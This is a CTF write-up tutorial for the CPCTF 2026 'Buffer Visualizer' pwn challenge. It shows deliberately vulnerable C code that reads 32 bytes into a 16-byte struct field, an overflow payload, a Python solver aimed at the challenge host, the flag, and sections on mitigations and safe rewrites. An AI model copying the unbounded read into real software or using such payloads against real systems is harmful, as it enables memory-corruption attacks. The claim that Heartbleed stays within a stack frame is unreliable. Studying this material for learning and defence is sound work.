+++
title = "CPCTF 2026 / Buffer Visualizer — Anatomy of an Adjacent-Field Stack Overflow"
description = "A 1980s-flavored stack overflow against an interactive C binary, walked through end-to-end: stack and struct layout, why read() leaves the trailing newline, the four-byte sliding window between A * 16 + ADMIN and a winning state, modern mitigations, and how to write the same code safely in 2026."
date = 2026-05-02
updated = 2026-05-02
draft = false

[taxonomies]
tags = ["pwn", "stack-overflow", "buffer-overflow", "c", "cpctf-2026", "memory-safety", "exploit-development", "tutorial"]

[extra]
challenge_category = "Pwn"
challenge_difficulty = "Lv.2"
challenge_score = "50.00"
challenge_author = "quarantineee"
flag = "CPCTF{y0u_4r3_PWN_h4ck3r}"
+++

> 隣のあいつを書き換えよう！ — *Overwrite the one next door!*

That tagline is the entire point of the challenge, and it is also the entire point of every adjacent-field stack overflow that has ever shown up in a real-world advisory. CPCTF 2026's **Buffer Visualizer** is a deliberately gentle introduction to the bug class — the binary literally draws the memory layout for you between every read — but the underlying primitive is the same one that powered Morris (1988), Code Red (2001), and a long tail of CVEs that are still landing in 2026 against C codebases that never got rewritten.

This post walks the challenge end-to-end and uses it as a coat-hook to hang a more comprehensive tutorial on:

1. how local variables and structs are actually laid out on the x86-64 SysV stack,
2. why `read(2)` is not `gets(3)` but is still dangerous in the same way,
3. the small but important difference between *overflowing into a return address* (classic `ret2win`) and *overflowing into an adjacent field* (this challenge),
4. what every mitigation in the modern hardening stack — stack canaries, NX, ASLR, `FORTIFY_SOURCE`, `-D_FORTIFY_SOURCE=3`, ASan — would have done, and why this binary was built with them all turned off,
5. how to write the same program in 2026 without the bug.

## The challenge

| Field | Value |
|---|---|
| Category | Pwn |
| Difficulty | Lv.2 |
| Score | 50.00 |
| Author | quarantineee |
| Hint | "Try entering 16 or more characters. How does `target`'s value change?" |

Attachments: `visualizer.c`, the compiled `visualizer` binary, and a per-user remote instance.

The full source — short enough to fit on one screen — is what makes this a teaching challenge:

```c
// gcc -fno-stack-protector -o visualizer visualizer.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

struct Task {
    char buffer[16];
    char target[8];
};

void print_flag(void) {
    printf("\nYou have successfully performed a buffer overflow!\n");
    system("cat flag.txt");
    exit(0);
}

void print_visualizer(struct Task *t) {
    printf("\n--- Memory ---\n");
    printf("| buffer ---------------------- | target ------ |\n");
    unsigned char *ptr = (unsigned char *)t;
    for (int i = 0; i < 24; i++) {
        char c = ptr[i];
        printf(" %c", (c >= 32 && c <= 126) ? c : '.');
    }
    printf("\n--------------\n");
}

int main(void) {
    struct Task t;
    memset(t.buffer, '.', sizeof(t.buffer));
    strcpy(t.target, "GUEST");
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Goal: Overwrite target with 'ADMIN'\n");

    while (1) {
        print_visualizer(&t);
        printf("Input: ");
        int n = read(0, t.buffer, 32);
        if (n > 0 && t.buffer[n-1] == '\n') t.buffer[n-1] = '\0';

        if (strcmp(t.target, "ADMIN") == 0) {
            print_visualizer(&t);
            print_flag();
        } else {
            printf("Current target value: %s\n", t.target);
        }
    }
    return 0;
}
```

Three details matter and the rest is decoration:

1. `struct Task` packs a 16-byte `buffer` immediately followed by an 8-byte `target`.
2. `read(0, t.buffer, 32)` writes up to **32 bytes** into a **16-byte** field. The compiler doesn't care; `read` doesn't care; the kernel doesn't care.
3. The win condition is `strcmp(t.target, "ADMIN") == 0`, not control-flow hijack. We need `target` to literally contain `A`, `D`, `M`, `I`, `N`, `\0`.

That is the whole bug. Everything else in this post is making sure the reader actually sees *why* it works.

## Background: where local structs live

When `main` is entered, the x86-64 System V ABI (the calling convention every mainstream Linux compiler obeys) hands `main` a stack frame that grows downward. `gcc` reserves space for `struct Task t` — exactly 24 bytes — somewhere inside that frame. Compiled at `-O0` with `-fno-stack-protector`, the layout is the source order, with `buffer` at the lower address and `target` immediately above it:

```text
    higher addresses
    +---------------------------+
    | saved RBP                 |
    | return address            |
    +---------------------------+
    | t.target[7]               |   <- t + 23
    | t.target[6]               |
    | t.target[5]               |
    | t.target[4]   'T'         |
    | t.target[3]   'S'         |
    | t.target[2]   'E'         |
    | t.target[1]   'U'         |
    | t.target[0]   'G'         |   <- t + 16
    +---------------------------+
    | t.buffer[15]              |
    | ...                       |
    | t.buffer[1]               |
    | t.buffer[0]               |   <- t + 0   (this is &t)
    +---------------------------+
    lower addresses (stack grows here)
```

C structs are laid out in **declaration order**, with each field's offset rounded up to its natural alignment. `char` has alignment 1, so the layout is dense: `buffer` occupies offsets `[0..16)`, `target` occupies `[16..24)`. There is no padding between them and there is no canary between them, because `gcc -fno-stack-protector` was used at build time.

Anything that walks past `&t.buffer[15]` walks straight into `t.target[0]`. The compiler's bounds knowledge ends at the type system, and the type system stops at the field. `read(2)` doesn't know about either.

## Why read(2) is not gets(3) but acts like it here

Old pwn challenges love `gets(3)` because it has no length argument and was deprecated for that reason. Modern code reaches for `read(2)` because *it does have a length*:

```c
ssize_t read(int fd, void *buf, size_t count);
```

The trap is that `count` is the buffer the **programmer believes they are filling**, not the one C actually allocated. Here:

```c
int n = read(0, t.buffer, 32);
```

`t.buffer` is 16 bytes. `count` is 32. `read` will faithfully ask the kernel for up to 32 bytes and write them, in order, starting at `&t.buffer[0]`. Bytes 0–15 land in `buffer`. Bytes 16–23 land in `target`. Byte 24 onwards would land in saved RBP, the return address, and so on — but we don't need to go that far for this challenge.

This is the core lesson the challenge is actually teaching: *the size argument to `read`, `recv`, `memcpy`, `snprintf`, `fread`, and friends is a contract you have to enforce yourself.* The compiler will not check it, the linker will not check it, and the kernel will not check it.

## Crafting the payload

The win condition is `strcmp(t.target, "ADMIN") == 0`. `strcmp` reads from `t.target[0]` until it hits a `\0`. So we need:

- bytes 0–15: anything, just to fill `buffer`
- bytes 16–20: `A`, `D`, `M`, `I`, `N`
- byte 21: `\0`

The straightforward 22-byte payload would be `"X" * 16 + "ADMIN\0"`. But we are typing into a TTY-shaped `read(0, ...)`, and sending a literal NUL byte from the shell is awkward. The trick the challenge nudges you toward — and the part that makes this writeup actually interesting — is the post-read fixup:

```c
int n = read(0, t.buffer, 32);
if (n > 0 && t.buffer[n-1] == '\n') t.buffer[n-1] = '\0';
```

If the input ends with `\n`, the program rewrites that final byte to `\0`. So if our payload is:

```text
"A" * 16 + "ADMIN" + "\n"
```

— that's 22 bytes — `read` returns `n = 22`, the last byte is `\n` at offset 21, the fixup overwrites it with `\0`, and we end up with:

```text
buffer  = "AAAAAAAAAAAAAAAA"   (16 bytes, no terminator inside the field)
target  = "ADMIN\0"            (5 chars + terminator at offset 21)
```

`strcmp(t.target, "ADMIN")` returns `0`. `print_flag` runs.

The memory diagram in transition:

```text
before: . . . . . . . . . . . . . . . .  G U E S T . . .
after:  A A A A A A A A A A A A A A A A  A D M I N \0 . .
                                         ^^^^^^^^^^^
                                         our overflow
```

There is a subtler win path. If our input were 21 bytes — `"A" * 16 + "ADMI"` followed by `N\n` would still be 22; *exactly* `"A" * 16 + "ADMIN"` with no newline is 21 bytes — `read` returns `n = 21`, the last byte is `N` (not `\n`), the fixup is skipped, and `target` becomes `ADMIN` followed by *whatever the stack already held* at offset 21. If that byte happened to be `\0` (it is, because `strcpy(t.target, "GUEST")` wrote `G`,`U`,`E`,`S`,`T`,`\0` at offsets 16–21), the strcmp succeeds without needing the fixup at all. The fixup path is the *intended* solution because it works regardless of residual stack contents; the no-fixup path is fragile across compilers.

This is the part of pwn that nobody tells you up front: **payloads are about the program's state machine, not just the bytes**. Two payloads that look almost identical can have completely different reliability profiles depending on what you assume about uninitialized memory.

## Hitting it remotely

The challenge runs as a per-user network instance. The supplied solver:

```python
import socket

HOST = "133.88.122.244"
PORT = 30788
PAYLOAD = b"A" * 16 + b"ADMIN\n"

def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.recv(4096)              # consume the welcome banner
        sock.sendall(PAYLOAD)        # 22 bytes, single send
        chunks = []
        sock.settimeout(2)
        while True:
            try:
                data = sock.recv(4096)
            except TimeoutError:
                break
            if not data:
                break
            chunks.append(data)
    print(b"".join(chunks).decode("latin1", "replace"), end="")
```

Three things worth noting for anyone writing their first pwn solver:

- **Why `latin1` decode.** The remote prints arbitrary bytes (the visualizer dumps memory). UTF-8 will throw on invalid sequences; `latin1` is a 1:1 byte-to-codepoint map so it never raises and you see exactly what the binary sent.
- **Why a single `sendall`.** Because `read(2)` will gladly stitch together multiple TCP packets, but it can also return early if the kernel hands back a short read. A single `sendall` of 22 bytes is the minimum surface area for a flake.
- **Why the timeout loop.** The remote calls `exit(0)` after `print_flag`, so the socket closes when we win. Reading until close is the simplest synchronization.

Run it, see the flag:

```text
CPCTF{y0u_4r3_PWN_h4ck3r}
```

## What every modern mitigation would have done

The build line at the top of the source — `gcc -fno-stack-protector` — quietly disables one of the four standard stack-overflow defenses. Worth running through all of them, since "what does each mitigation block" is the actual interview question this challenge is rehearsing.

### Stack canary (`-fstack-protector-strong`)

Default in modern gcc/clang for any function with a stack buffer. The compiler inserts a random word between the local variables and the saved frame pointer at function entry, and checks it before `ret`. If we overflowed past `t` into the canary, `__stack_chk_fail` would `abort()` the process before `print_flag` could ever be called.

This challenge bypasses the canary by **not needing to reach it**. We only walk 6 bytes past `buffer`, into `target`. The canary lives further up, near the saved frame pointer. Stack canaries protect *return addresses*, not *adjacent struct fields*. This is the single most important nuance of the canary mitigation and the reason adjacent-field overflows are quietly common in real CVEs even on hardened binaries.

### NX (`-Wl,-z,noexecstack`)

The stack is mapped non-executable. Shellcode written into the buffer can't be run. Irrelevant here because we don't write shellcode and don't redirect execution — `print_flag` is already in the binary.

### ASLR + PIE

The address of `print_flag` is randomized per run. Irrelevant here because we don't need to know `print_flag`'s address — the legitimate code path calls it for us once `strcmp` returns `0`.

### `FORTIFY_SOURCE`

Compiled with `-D_FORTIFY_SOURCE=2` (default on most distros under `-O2`), glibc swaps `memcpy`, `strcpy`, `snprintf`, `read`, etc. for `__*_chk` variants when the destination size is known at compile time. For `read(0, t.buffer, 32)` with `t.buffer` of size 16, glibc's `__read_chk` would `__chk_fail()` at runtime.

`-D_FORTIFY_SOURCE=3` (gcc 12+, glibc 2.34+) extends this to many cases the compiler used to miss. Either level kills this exact bug.

### AddressSanitizer (`-fsanitize=address`)

A debug-time mitigation. ASan would catch the out-of-bounds write the moment `read` writes past `&t.buffer[15]` and print a beautiful report. It's the right tool for catching this class of bug in CI before it ever ships.

### Putting it together

The build line tells the whole story:

```sh
gcc -fno-stack-protector -o visualizer visualizer.c
```

No canary (explicit), no PIE (default off without `-pie`), no fortification (no `-D_FORTIFY_SOURCE` and no `-O2`), no ASan, no warnings (no `-Wall`). It is a CTF binary built to be exploitable. A real production binary built with `gcc -O2 -Wall -Wextra -fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -Wl,-z,now,-z,relro,-z,noexecstack` would block this exact payload at runtime via `FORTIFY_SOURCE`, and would catch it at build time if the developer also enabled `-fanalyzer` (gcc 14+).

## How to write this in 2026 without the bug

The fix is one character — `32` becomes `sizeof(t.buffer)`:

```c
int n = read(0, t.buffer, sizeof(t.buffer));
```

But "use sizeof" is a **rule of thumb that fails the moment someone changes the type**. The deeper fixes:

```c
// Option 1: bounded read with explicit length
char input[sizeof(t.buffer)];
ssize_t n = read(0, input, sizeof(input));
if (n < 0) { /* handle */ }
size_t to_copy = (size_t)n < sizeof(t.buffer) ? (size_t)n : sizeof(t.buffer) - 1;
memcpy(t.buffer, input, to_copy);
t.buffer[to_copy] = '\0';
```

```c
// Option 2: fgets — bounded by construction, always NUL-terminates
if (!fgets(t.buffer, sizeof(t.buffer), stdin)) { /* handle EOF */ }
t.buffer[strcspn(t.buffer, "\n")] = '\0';
```

```c
// Option 3: don't write C
// Rewrite in Rust, where the compiler refuses to compile a slice index
// that escapes its container, and where String / Vec carry their own length.
```

The first two are tactical fixes; the third is the strategic one. Linux kernel (since 2022), Android system services, parts of Chrome and Firefox, and a growing share of new infrastructure code at every major cloud are migrating exactly these patterns to memory-safe languages because the cost-per-CVE math finally tipped over. CISA's 2023 [The Case for Memory Safe Roadmaps](https://www.cisa.gov/resources-tools/resources/case-memory-safe-roadmaps) is the policy-level statement of the same conclusion.

## Defensive takeaways

- **Bounds are programmer responsibility in C.** No tool in the standard toolchain checks that `read(fd, buf, n)`'s `n` matches `buf`'s actual size. Habits — `sizeof(buf)`, never magic numbers — are the only defense at the source level.
- **Stack canaries do not protect adjacent fields.** They protect return addresses. CVE patterns like Heartbleed (CVE-2014-0160) and many integer-truncation OOB-writes live happily inside a single stack frame without ever touching the canary.
- **`FORTIFY_SOURCE` is free.** Turn it on. Anything caught by `__*_chk` at runtime is a bug you didn't ship.
- **ASan in CI is non-negotiable.** Cost is one extra CI lane; benefit is every category of memory-safety bug in your test corpus surfacing before code review.
- **Track the difference between control-flow hijack and data-only attacks.** The latter is what this challenge is. They are reliably under-appreciated by junior reviewers because the demo does not pop a shell — but a one-bit privilege escalation (`isAdmin = false → true`) is often more valuable to an attacker than a shell.

## References

- [GCC manual — `-fstack-protector*`](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html)
- [glibc — `_FORTIFY_SOURCE` levels](https://www.gnu.org/software/libc/manual/html_node/Source-Fortification.html)
- [CISA — The Case for Memory Safe Roadmaps (2023)](https://www.cisa.gov/resources-tools/resources/case-memory-safe-roadmaps)
- [Linux man-pages — `read(2)`](https://man7.org/linux/man-pages/man2/read.2.html)
- [LWN — How memory-safe languages reach the Linux kernel](https://lwn.net/Articles/930736/)
- Aleph One, *Smashing The Stack For Fun And Profit*, Phrack 49 (1996) — the original tutorial; still the clearest explanation of the call stack at the byte level.

## Flag

```text
CPCTF{y0u_4r3_PWN_h4ck3r}
```
